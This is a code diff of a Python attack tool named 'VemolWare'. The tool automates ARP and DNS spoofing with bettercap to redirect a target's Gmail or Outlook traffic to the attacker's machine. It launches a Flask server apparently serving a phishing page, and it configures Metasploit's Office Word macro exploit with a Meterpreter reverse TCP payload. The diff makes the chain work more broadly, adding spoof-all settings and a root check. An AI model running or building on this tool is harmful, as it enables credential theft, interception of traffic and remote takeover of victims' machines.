@@ -18,9 +18,9 @@ LOCAL_IP = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
 class VemolWare:
     def __init__(self):
 
-        # if os.geteuid() != 0:
-        #     print ("[-] Run me as root")
-        #     sys.exit(1)
+        if os.geteuid() != 0:
+            print ("[-] Run me as root")
+            sys.exit(1)
 
         # ------------ Main ------------
         usage = 'Usage: %prog [-i interface] [-t target] host/s'
@@ -41,7 +41,6 @@ class VemolWare:
             print("[2] - Outlook.")
             print("[3] - Other.\n\n")
             self.option_domain = input("Selected option: ")
-            import ipdb; ipdb.set_trace()
             self.option_domain = DOMAIN_TARGET.get(self.option_domain, '')[0]
             if self.option_domain == 3:
                 new_domain = input("\n\nEnter your domain: ")
@@ -52,11 +51,13 @@ class VemolWare:
             sys.exit(0)
     
     def create_config_file_bettercap(self):
-        file = open('config_bettercap.txt','w') 
+        file = open('config/config_bettercap.txt','w') 
         file.write(f'set arp.spoof.targets {self.options.target}\n')
+        file.write('set arp.spoof.internal true\n')
         file.write('arp.spoof on\n')
         file.write(f'set dns.spoof.address {LOCAL_IP}\n')
-        file.write('set dns.spoof.domains {self.option_domain}\n')
+        file.write(f'set dns.spoof.domains {self.option_domain}, www.vemol.com\n')
+        file.write('set dns.spoof.all true\n')
         file.write('dns.spoof on\n')
         file.close()
 
@@ -66,16 +67,18 @@ class VemolWare:
 
     def bettercap(self):
         # Setting up Bettercap
-        command = f'gnome-terminal -- bettercap --caplet config_bettercap.txt'
+        command = f'gnome-terminal -- bettercap --caplet config/config_bettercap.txt'
         os.system(command)
     
     def flask_server (self):
         # Starting Flask server targeting domain address
-        command = f'gnome-terminal -- python3 app.py {self.option_domain}'
+        gmail_template = DOMAIN_TARGET.get('1')[1]
+        if 'gmail' in self.option_domain:
+            command = f'gnome-terminal -- python3 app.py {gmail_template}'
         os.system(command)
     
     def create_config_file_metasploit(self):
-        file = open('commands_msf.txt','w')
+        file = open('config/commands_msf.txt','w')
         file.write(f'use exploit/multi/fileformat/office_word_macro\n')
         file.write(f'set payload windows/meterpreter/reverse_tcp\n')
         file.write(f'set lhost {LOCAL_IP}\n')
@@ -90,15 +93,14 @@ class VemolWare:
     def start_metasploit(self):
         # Starting MSFConsole
         self.create_config_file_metasploit()
-        command = f'gnome-terminal -- msfconsole -r commands_msf.txt'
+        command = f'gnome-terminal -- msfconsole -r config/commands_msf.txt'
         os.system(command)
     
     def main(self):
-        while True:
-            self.create_config_file_bettercap()
-            self.bettercap()
-            self.flask_server()
-            self.start_metasploit()
+        self.create_config_file_bettercap()
+        self.bettercap()
+        self.flask_server()
+        self.start_metasploit()
 
 
 if __name__ == "__main__":
